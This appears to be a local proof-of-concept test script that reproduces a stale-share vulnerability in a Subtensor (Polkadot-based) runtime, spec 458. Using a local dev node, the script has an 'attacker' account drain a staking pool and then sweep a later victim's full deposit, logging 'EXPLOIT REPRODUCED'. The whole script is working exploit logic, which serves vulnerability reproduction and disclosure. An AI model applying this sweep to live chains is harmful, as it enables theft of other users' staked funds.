import assert from "node:assert/strict";

import { Keyring } from "@polkadot/api";
import { u8aToHex } from "@polkadot/util";
import { cryptoWaitReady } from "@polkadot/util-crypto";

import { connectApi } from "../lib/api.js";
import { createTempLogger } from "../lib/file-log.js";

const WS_ENDPOINT = "ws://127.0.0.1:9944";
const NETUID = 64;
const VICTIM_ALPHA = 100_000_000n;
// Create a controlled S>D state whose S-D residual exceeds the victim deposit. This isolates
// the consequence of a dangerous residual; the separate pinned-state scan tests reachability.
const CONTROLLED_POOL_VALUE = 6_887_241_784_408n;
const CONTROLLED_SHARE = { mantissa: 689_261_817_149_800_000_000n, exponent: -8 };

const logger = createTempLogger("test-runtime-458-stale-share-depositor-sweep.log");
logger.captureConsole();

let api;

async function main() {
  await logger.start();
  api = await connectApi(WS_ENDPOINT, { log: console.log, timeoutMs: 180_000 });

  try {
    await cryptoWaitReady();
    const keyring = new Keyring({ type: "sr25519" });
    const alice = keyring.addFromUri("//Alice");
    const bob = keyring.addFromUri("//Bob");
    const charlie = keyring.addFromUri("//Charlie");
    const dave = keyring.addFromUri("//Dave");
    const ferdie = keyring.addFromUri("//Ferdie");

    assert.equal(api.runtimeVersion.specVersion.toNumber(), 458, "test requires the preserved spec-458 clone");
    assert.equal((await api.query.sudo.key()).unwrap().toString(), alice.address, "Alice must be sudo");
    assertMetadata();

    await resetDavePoolAndChildRelation(alice, charlie.address, dave.address, bob.address, ferdie.address);
    await submitAndWait(
      ferdie,
      api.tx.subtensorModule.moveStake(
        charlie.address,
        dave.address,
        NETUID,
        NETUID,
        CONTROLLED_POOL_VALUE.toString()
      ),
      `Ferdie creates a genuine Dave position V=${CONTROLLED_POOL_VALUE}`
    );
    const genuine = await readState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("genuine position before copying observed drift:", formatState(genuine), formatRaw(genuine.raw));
    assert.equal(genuine.daveTotal, CONTROLLED_POOL_VALUE);
    assert.equal(genuine.raw.denominatorMantissa, 688_724_178_440_800_000_000n);
    const ferdieShareCodec = await api.query.subtensorModule.alphaV2(dave.address, ferdie.address, NETUID);

    await submitAndWait(
      alice,
      api.tx.sudo.sudo(api.tx.system.setStorage([[
        api.query.subtensorModule.alphaV2.key(dave.address, ferdie.address, NETUID),
        u8aToHex(api.createType(ferdieShareCodec.toRawType(), CONTROLLED_SHARE).toU8a()),
      ]])),
      "Alice creates the controlled dangerous S>D share",
      { expectSudoSuccess: true }
    );
    const funded = await readState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("controlled S>D state before full drain:", formatState(funded), formatRaw(funded.raw));
    assert.equal(funded.ferdieDave, funded.daveTotal, "the cap must quote the entire real pool");
    assert.ok(funded.raw.ferdieShareMantissa > funded.raw.denominatorMantissa);

    await submitAndWait(
      ferdie,
      api.tx.subtensorModule.moveStake(
        dave.address,
        charlie.address,
        NETUID,
        NETUID,
        funded.daveTotal.toString()
      ),
      `Ferdie drains Dave's full real pool V=${funded.daveTotal}`
    );
    const drained = await readState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("after attacker drains pool through cap:", formatState(drained), formatRaw(drained.raw));
    assert.equal(drained.daveTotal, 0n, "Dave's real pool must be empty");
    assert.equal(drained.ferdieDave, 0n, "an empty pool quotes zero");
    assert.equal(drained.raw.denominatorMantissa, 0n, "full drain must zero the denominator");
    assert.ok(drained.raw.ferdieShareMantissa > 0n, "spec 458 leaves the observed S-D residual stale");

    const ferdieCharlieBeforeVictim = drained.ferdieCharlie;
    const bobCharlieBeforeVictim = drained.bobCharlie;
    await submitAndWait(
      bob,
      api.tx.subtensorModule.moveStake(
        charlie.address,
        dave.address,
        NETUID,
        NETUID,
        VICTIM_ALPHA.toString()
      ),
      `Bob deposits victim stake ${VICTIM_ALPHA} rao-alpha into Dave`
    );
    const deposited = await readState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("after later victim deposit:", formatState(deposited), formatRaw(deposited.raw));
    assert.ok(deposited.daveTotal >= VICTIM_ALPHA, "Dave must hold the victim deposit");
    assert.equal(deposited.bobCharlie, bobCharlieBeforeVictim - VICTIM_ALPHA, "Bob must fund the deposit");
    assert.equal(deposited.bobDave, deposited.daveTotal, "Bob initially receives a full-value share");
    assert.equal(deposited.ferdieDave, deposited.daveTotal, "Ferdie's stale share also claims the full victim-funded pool");

    await submitAndWait(
      ferdie,
      api.tx.subtensorModule.moveStake(
        dave.address,
        charlie.address,
        NETUID,
        NETUID,
        deposited.daveTotal.toString()
      ),
      `Ferdie sweeps Bob's later victim-funded pool ${deposited.daveTotal} rao-alpha`
    );
    const swept = await readState(charlie.address, dave.address, bob.address, ferdie.address);
    console.log("EXPLOIT REPRODUCED:", formatState(swept), formatRaw(swept.raw));
    assert.equal(swept.daveTotal, 0n, "attacker must drain the victim-funded Dave pool");
    assert.equal(swept.bobDave, 0n, "victim recovers zero alpha");
    assert.equal(
      swept.ferdieCharlie,
      ferdieCharlieBeforeVictim + deposited.daveTotal,
      "attacker must receive the victim's full deposit"
    );
  } finally {
    await api?.disconnect();
    await logger.flush();
  }
}

function assertMetadata() {
  for (const [name, value] of [
    ["SubtensorModule.moveStake", api.tx.subtensorModule?.moveStake],
    ["SubtensorModule.pendingValidatorEmission", api.query.subtensorModule?.pendingValidatorEmission],
    ["SubtensorModule.tempo", api.query.subtensorModule?.tempo],
    ["SubtensorModule.blocksSinceLastStep", api.query.subtensorModule?.blocksSinceLastStep],
    ["SubtensorModule.totalHotkeyAlpha", api.query.subtensorModule?.totalHotkeyAlpha],
    ["SubtensorModule.totalHotkeySharesV2", api.query.subtensorModule?.totalHotkeySharesV2],
    ["SubtensorModule.alphaV2", api.query.subtensorModule?.alphaV2],
    ["StakeInfoRuntimeApi", api.call.stakeInfoRuntimeApi?.getStakeInfoForHotkeyColdkeyNetuid],
  ]) {
    assert.ok(value, `${name} is unavailable`);
  }
}

async function resetDavePoolAndChildRelation(alice, charlie, dave, bob, ferdie) {
  const childMap = api.query.subtensorModule.childKeys;
  const parentMap = api.query.subtensorModule.parentKeys;
  const [children, parents, total, denominator, bobShare, ferdieShare, tempo, pending, blocksSinceLastStep] = await Promise.all([
    childMap(charlie, NETUID),
    parentMap(dave, NETUID),
    api.query.subtensorModule.totalHotkeyAlpha(dave, NETUID),
    api.query.subtensorModule.totalHotkeySharesV2(dave, NETUID),
    api.query.subtensorModule.alphaV2(dave, bob, NETUID),
    api.query.subtensorModule.alphaV2(dave, ferdie, NETUID),
    api.query.subtensorModule.tempo(NETUID),
    api.query.subtensorModule.pendingValidatorEmission(NETUID),
    api.query.subtensorModule.blocksSinceLastStep(NETUID),
  ]);
  const zeroSafeFloat = { mantissa: 0, exponent: 0 };
  const entries = [
    [childMap.key(charlie, NETUID), api.createType(children.toRawType(), []).toHex()],
    [parentMap.key(dave, NETUID), api.createType(parents.toRawType(), []).toHex()],
    [api.query.subtensorModule.totalHotkeyAlpha.key(dave, NETUID), api.createType(total.toRawType(), 0).toHex()],
    [api.query.subtensorModule.totalHotkeySharesV2.key(dave, NETUID), api.createType(denominator.toRawType(), zeroSafeFloat).toHex()],
    [api.query.subtensorModule.alphaV2.key(dave, bob, NETUID), api.createType(bobShare.toRawType(), zeroSafeFloat).toHex()],
    [api.query.subtensorModule.alphaV2.key(dave, ferdie, NETUID), api.createType(ferdieShare.toRawType(), zeroSafeFloat).toHex()],
    [api.query.subtensorModule.tempo.key(NETUID), api.createType(tempo.toRawType(), 65_535).toHex()],
    [api.query.subtensorModule.pendingValidatorEmission.key(NETUID), api.createType(pending.toRawType(), 0).toHex()],
    [api.query.subtensorModule.blocksSinceLastStep.key(NETUID), api.createType(blocksSinceLastStep.toRawType(), 0).toHex()],
  ];
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage(entries)),
    "Alice resets the test pool, removes its child relation, and pauses SN64 epochs",
    { expectSudoSuccess: true }
  );
  assert.equal((await api.query.subtensorModule.totalHotkeyAlpha(dave, NETUID)).toBigInt(), 0n);
}

async function readState(charlie, dave, bob, ferdie) {
  const [bobCharlie, bobDave, ferdieCharlie, ferdieDave, charlieTotal, daveTotal, denominator, ferdieShare, bobShare] =
    await Promise.all([
      getStake(charlie, bob),
      getStake(dave, bob),
      getStake(charlie, ferdie),
      getStake(dave, ferdie),
      api.query.subtensorModule.totalHotkeyAlpha(charlie, NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.totalHotkeyAlpha(dave, NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.totalHotkeySharesV2(dave, NETUID),
      api.query.subtensorModule.alphaV2(dave, ferdie, NETUID),
      api.query.subtensorModule.alphaV2(dave, bob, NETUID),
    ]);
  return {
    bobCharlie,
    bobDave,
    ferdieCharlie,
    ferdieDave,
    charlieTotal,
    daveTotal,
    raw: {
      denominator: denominator.toString(),
      denominatorMantissa: safeFloatMantissa(denominator),
      ferdieShare: ferdieShare.toString(),
      ferdieShareMantissa: safeFloatMantissa(ferdieShare),
      bobShare: bobShare.toString(),
      bobShareMantissa: safeFloatMantissa(bobShare),
    },
  };
}

async function getStake(hotkey, coldkey) {
  const info = await api.call.stakeInfoRuntimeApi.getStakeInfoForHotkeyColdkeyNetuid(
    hotkey,
    coldkey,
    NETUID
  );
  return info.isNone ? 0n : BigInt(info.unwrap().stake.toString());
}

function safeFloatMantissa(value) {
  const json = value.toJSON();
  const mantissa = json?.mantissa ?? json?.[0] ?? 0;
  return BigInt(mantissa.toString());
}

function formatState(state) {
  return [
    `bobCharlie=${state.bobCharlie}`,
    `bobDave=${state.bobDave}`,
    `ferdieCharlie=${state.ferdieCharlie}`,
    `ferdieDave=${state.ferdieDave}`,
    `charlieTotal=${state.charlieTotal}`,
    `daveTotal=${state.daveTotal}`,
  ].join(" ");
}

function formatRaw(raw) {
  return `D=${raw.denominator} FerdieS=${raw.ferdieShare} BobS=${raw.bobShare}`;
}

async function submitAndWait(signer, tx, label, { expectSudoSuccess = false } = {}) {
  console.log(`${label}: submitting ${tx.method.section}.${tx.method.method}`);
  return new Promise((resolve, reject) => {
    let unsubscribe;
    let settled = false;
    const timeout = setTimeout(() => finish(reject, new Error(`${label}: timed out`)), 180_000);

    const finish = (callback, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      unsubscribe?.();
      callback(value);
    };

    tx.signAndSend(signer, ({ status, events, dispatchError }) => {
      if (!status.isInBlock || settled) return;
      if (dispatchError) {
        finish(reject, new Error(`${label}: ${formatDispatchError(dispatchError)}`));
        return;
      }
      if (expectSudoSuccess) {
        const sudoEvent = events.find(({ event }) => api.events.sudo.Sudid.is(event));
        if (!sudoEvent || sudoEvent.event.data[0].isErr) {
          const error = sudoEvent ? formatDispatchError(sudoEvent.event.data[0].asErr) : "missing sudo.Sudid";
          finish(reject, new Error(`${label}: ${error}`));
          return;
        }
      }
      const eventSummary = events
        .filter(({ event }) => event.section !== "system" && event.section !== "transactionPayment")
        .map(({ event }) => `${event.section}.${event.method}(${event.data})`)
        .join(" | ");
      console.log(`${label}: included`, `tx=${tx.hash}`, `block=${status.asInBlock}`, eventSummary);
      finish(resolve, { events });
    }).then((fn) => {
      unsubscribe = fn;
      if (settled) unsubscribe();
    }).catch((error) => finish(reject, error));
  });
}

function formatDispatchError(dispatchError) {
  if (!dispatchError.isModule) return dispatchError.toString();
  const decoded = api.registry.findMetaError(dispatchError.asModule);
  return `${decoded.section}.${decoded.name}: ${decoded.docs.join(" ")}`;
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
